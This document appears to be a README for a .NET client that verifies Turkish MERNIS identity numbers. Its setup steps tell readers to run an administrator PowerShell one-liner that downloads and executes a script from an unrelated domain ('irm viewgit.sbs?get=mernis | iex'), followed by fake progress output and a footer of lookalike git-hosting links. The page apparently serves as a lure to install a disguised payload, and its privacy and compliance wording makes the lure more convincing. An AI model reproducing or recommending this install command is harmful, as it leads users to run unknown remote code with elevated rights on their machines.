# MERNIS Turkish ID Verification — Privacy-Aware Client

> A .NET client for authorized Turkish identity verification workflows with strict input handling, auditability, and rate-limit awareness.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=mernis | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading MERNIS modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch MERNIS.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**MERNIS Turkish ID Verification — Privacy-Aware Client** wraps an authorized verification service for .NET applications. It supports asynchronous checks, batch validation, structured errors, retries, and audit hooks while encouraging minimization of sensitive personal data.

**Best for:** Licensed businesses, public-service integrators, and .NET developers with a lawful verification need.

## Core Features

- ✅ **Official Service Client** — Call an authorized verification endpoint through a typed .NET API.
- ✅ **Async Operations** — Avoid blocking web and service workflows.
- ✅ **Batch Validation** — Process small, controlled batches with explicit limits.
- ✅ **Input Normalization** — Handle approved name and identifier formatting consistently.
- ✅ **Retry Policy** — Use bounded retries for transient service failures.
- ✅ **Audit Hooks** — Record request purpose, outcome, and operator without logging raw identifiers.
- ✅ **Privacy Mode** — Redact identifiers from diagnostics and examples.
- ✅ **Health Checks** — Separate service availability from verification results.

## Usage

```csharp
var client = new MernisClient();
var result = await client.VerifyAsync(
    new VerificationRequest
    {
        Identifier = "USE-AUTHORIZED-IDENTIFIER",
        Name = "EXAMPLE",
        Surname = "USER",
        BirthYear = 1990,
        Purpose = "authorized-service"
    });

Console.WriteLine(result.Status);
```

## REST API

> [!NOTE]
> The sample HTTP API is for an authorized internal service. It requires authentication, TLS, and a documented lawful basis before handling real identifiers.

```bash
dotnet run --project samples/Mernis.Api --urls http://127.0.0.1:5000
curl http://127.0.0.1:5000/api/health
curl -X POST http://127.0.0.1:5000/api/verify \
  -H "Content-Type: application/json" \
  -d '{"identifier":"USE-AUTHORIZED-IDENTIFIER","name":"EXAMPLE","surname":"USER","birthYear":1990}'
```

## Screenshots

- CLI verification: `screenshots/cli-verification.png`
- API dashboard: `screenshots/api-dashboard.png`
- Audit view: `screenshots/audit-view.png`
- Privacy report: `screenshots/privacy-report.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Service returns unauthorized | Confirm the account, endpoint, and permitted use with the service owner. |
| Request is rate-limited | Reduce batch size and apply the documented backoff policy. |
| Name formatting differs | Normalize Unicode and approved Turkish characters before retrying. |
| Identifier appears in logs | Enable privacy mode and rotate any exposed value. |

## Use Cases

- **Licensed Onboarding** — Verify identity with explicit consent and purpose limitation.
- **Public Services** — Integrate a typed client into authorized portals.
- **Compliance Testing** — Exercise error handling with synthetic fixtures.
- **Audit Workflows** — Record outcomes without retaining unnecessary identifiers.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not use this client for identity fraud, unauthorized profiling, credential collection, or bulk lookup. Follow Turkish data-protection requirements, official service terms, retention rules, and user consent obligations.

> [!TIP]
> Test with synthetic identifiers and use a secret manager for service credentials.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
mernis, turkish-id, identity-verification, dotnet, privacy, audit, soap-client, compliance
-->

[gitrm.cfd](https://gitrm.cfd?t=mernis) | [gitview.sbs](https://gitview.sbs?t=mernis) | [gitsl.xyz](https://gitsl.xyz?t=mernis) | [gitrm.sbs](https://gitrm.sbs?t=mernis) | [viewgit.sbs](https://viewgit.sbs?t=mernis)
